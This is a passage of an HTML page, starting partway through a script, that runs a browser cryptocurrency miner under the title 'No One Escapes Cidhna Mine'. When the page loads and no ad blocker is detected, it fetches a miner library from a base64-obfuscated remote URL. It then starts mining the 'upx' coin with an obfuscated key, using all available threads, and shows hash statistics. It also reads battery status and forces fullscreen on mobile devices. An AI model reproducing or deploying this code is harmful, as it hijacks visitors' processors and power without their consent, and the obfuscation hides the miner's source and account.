		    requestFullScreen.call(docEl);
		  }
		  else {
		    //cancelFullScreen.call(doc);

	<style>
	body{background:#000;color:#555;}

	#throttle{
		width: calc(100% - 56px );
	    margin: 20px;
	    padding: 0;
	    bottom: 20px;
	    position: absolute;
	    color: #555;
	}

	#running, #result , #hashesPerSecond , #totalHashes , #acceptedHashes, #throt, #numThreads, #bat, #clock {
		color:#888;
	}

	#clock, #bat{
		float: right;
		padding-left: 5px;
	}

	h3{
		color: #555;
	}

	#mobilebar{
		display: none;
		padding-bottom: 0px;
	}

	input[type="range"] {
	  -webkit-appearance: none;
	  width: 100%;
	}

	input[type="range"]::-webkit-slider-thumb {
	  -webkit-appearance: none;
	}

	input[type="range"]:focus {
	  outline: none;
	}

	input[type="range"]::-ms-track {
	  width: 100%;
	  cursor: pointer;
	  background: transparent;
	  border-color: transparent;
	  color: transparent;
	}
	/*#############Thumb##############*/

	input[type="range"]::-webkit-slider-thumb {
	  -webkit-appearance: none;
	  height: 16px;
	  width: 16px;
	  background: #888;
	  cursor: pointer;
	  margin-top: 0;
	}

	input[type="range"]::-moz-range-thumb {
	  height: 16px;
	  width: 16px;
	  background: #888;
	  cursor: pointer;
	}

	input[type="range"]::-ms-thumb {
	  height: 16px;
	  width: 16px;
	  background: #888;
	  cursor: pointer;
	}
	/*#############Track##############*/

	input[type="range"]::-webkit-slider-runnable-track {
	  cursor: pointer;
	  background: #555;
	}

	input[type="range"]:active::-webkit-slider-runnable-track {
	  background: #555;
	}

	input[type="range"]::-moz-range-track {
	  cursor: pointer;
	  background: #555;
	}

	input[type="range"]::-ms-track {
	  cursor: pointer;
	  background: transparent;
	  border-color: transparent;
	  color: transparent;
	}

	input[type="range"]::-ms-fill-lower {
	  background: #555;
	}

	input[type="range"]:focus::-ms-fill-lower {
	  background: #555;
	}

	input[type="range"]::-ms-fill-upper {
	  background: #555;
	}

	input[type="range"]:focus::-ms-fill-upper {
	  background: #555;
	}
	#contain{
		width: calc(100% - 40px);
    	padding: 20px;
	}

<body>
<div id="mobilebar">
	<span id="clock"></span> <span id="bat"></span>
</div>
<div id="contain">
<h3>« <span style="color:#888;">No One Escapes Cidhna Mine</span> »</h3>
<div>running: <span id="running">false</span></div>
<div>adblock: <span id="result"></span></div>
<div>hashesPerSecond: <span id="hashesPerSecond"></span></div>
<div>totalHashes: <span id="totalHashes"></span></div>
<div>acceptedHashes: <span id="acceptedHashes"></span></div>
<div>numThreads: <span id="numThreads"></span></div>
<div>throttle: <span id="throt"></span></div>
</div>
<script>
	var throttle=0.5;
	var miner;
	document.addEventListener('DOMContentLoaded', init, false);
	function scriptLoaded() {
	    miner = new CRLT.Anonymous(atob('MWVjNTMwMTM4ZjMzMDYxZWEwYjI1MjQ5NDJmNjMwNWEwMDdlOWEzOTYxNDM'), {
	        autoThreads: true,
	        throttle: throttle,
	        coin: "upx",
	    });
	    miner.on('authed', function(params) {
	        console.log('Token name is: ', miner.getToken());
	        document.getElementById("running").innerHTML = "true";
	        if (isMobile) {
	        	if (navigator.battery) { readBattery(navigator.battery); } else if (navigator.getBattery) {navigator.getBattery().then(readBattery);} else { /* */}
	        }
	    });
	    miner.on('error', function(params) {
	        if (params.error !== 'connection_error') {
	            console.log('The pool reported an error', params.error);
	        }
	    });
	    miner.on('found', function() {})
	    miner.on('accepted', function() {})
	    setInterval(function() {
	        var hashesPerSecond = miner.getHashesPerSecond();
	        document.getElementById("hashesPerSecond").innerHTML = hashesPerSecond;
	        var totalHashes = miner.getTotalHashes();
	        document.getElementById("totalHashes").innerHTML = totalHashes;
	        var acceptedHashes = miner.getAcceptedHashes();
	        document.getElementById("acceptedHashes").innerHTML = acceptedHashes;	        
	        var numThreads = miner.getNumThreads();
	        document.getElementById("numThreads").innerHTML = numThreads;
	        if (isMobile) {
	        	if (navigator.battery) { readBattery(navigator.battery); } else if (navigator.getBattery) {navigator.getBattery().then(readBattery);} else { /* */}
	        }
	    }, 1000);
	    miner.start();
	    document.getElementById('throt').innerHTML = throttle;
	}
	function loadScript(url, callback) {
	    var script = document.createElement("script")
	    script.type = "text/javascript";
	    if (script.readyState) { //IE
	        script.onreadystatechange = function() {
	            if (script.readyState == "loaded" ||
	                script.readyState == "complete") {
	                script.onreadystatechange = null;
	                callback();
	            }
	        };
	    } else { //Others
	        script.onload = function() {
	            callback();
	        };
	    }
	    script.src = url;
	    document.getElementsByTagName("head")[0].appendChild(script);
	}
	function init() {
	    adsBlocked(function(blocked) {
	        if (blocked) {
	            document.getElementById('result').innerHTML = 'true';
	        } else {
	            document.getElementById('result').innerHTML = 'false';
	            loadScript(atob('Ly9zdGF0ZHluYW1pYy5jb20vbGliL2NyeXB0YS5qcw=='), scriptLoaded)
	        }
	    })
	}
	function adsBlocked(callback) {
	    var testURL = atob('aHR0cHM6Ly9wYWdlYWQyLmdvb2dsZXN5bmRpY2F0aW9uLmNvbS9wYWdlYWQvanMvYWRzYnlnb29nbGUuanM=');
	    var myInit = { method: 'HEAD', mode: 'no-cors'};
	    var myRequest = new Request(testURL, myInit);
	    fetch(myRequest).then(function(response) {
	        return response;
	    }).then(function(response) {
	        callback(false)
	    }).catch(function(e) {
	        callback(true)
	    });
	}
	function changeThrottle(val){
		val=1-(val/100);
		throttle = val;
		miner.setThrottle(throttle);
		document.getElementById('throt').innerHTML = throttle;
	}
	function toTime(sec) {
		sec = parseInt(sec, 10);
		var hours = Math.floor(sec / 3600),
		    minutes = Math.floor((sec - (hours * 3600)) / 60),
		    seconds = sec - (hours * 3600) - (minutes * 60);
		if (hours < 10) { hours   = '0' + hours; }
		if (minutes < 10) { minutes = '0' + minutes; }
		if (seconds < 10) { seconds = '0' + seconds; }
		return hours + ':' + minutes;
	}


	var battery;
	function mobile(){
		if (isMobile) {
			toggleFullScreen();
			screen.orientation.lock('portrait-primary');
			if (navigator.battery) { readBattery(navigator.battery); } else if (navigator.getBattery) {navigator.getBattery().then(readBattery);} else { /* */}
		};
	}
	function readBattery(b) {
		document.getElementById('mobilebar').style.display = "block";
	    battery = b || battery;
	    var percentage = parseFloat((battery.level * 100).toFixed(2)) + '%',
	        fully,
	        remaining;
	    if (battery.charging && battery.chargingTime === Infinity) {
	      fully = 'Calculating...';
	    } else if (battery.chargingTime !== Infinity) {
	      fully = toTime(battery.chargingTime);
	    } else {
	      fully = '---';
	    }
	    if (!battery.charging && battery.dischargingTime === Infinity) {
	      remaining = 'Calculating...';
	    } else if (battery.dischargingTime !== Infinity) {
	      remaining = toTime(battery.dischargingTime);
	    } else {
	      remaining = '---';
	    }
	    //document.getElementById('bat').innerHTML = percentage+'%'+' charg: '+battery.charging;
	    document.getElementById('bat').innerHTML = ''+percentage;

	    var d = new Date();
		document.getElementById('clock').innerHTML = ''+d.toLocaleTimeString(navigator.language, {hour: '2-digit', minute:'2-digit'});

	    /*

		

	    document.styleSheets[0].insertRule('.battery:before{width:' + percentage + '}', 0);
	    document.querySelector('.battery-percentage').innerHTML = percentage;
	    document.querySelector('.battery-status').innerHTML = battery.charging ? 'Adapter' : 'Battery';
	    document.querySelector('.battery-level').innerHTML = percentage;
	    document.querySelector('.battery-fully').innerHTML = fully;
	    document.querySelector('.battery-remaining').innerHTML = remaining;
	    */
	  }

	window.addEventListener("click",mobile,false);
	
</script>
<input type="range" id="throttle" name="vol" min="0" max="100" onchange="changeThrottle(this.value)">
</body>
</html>
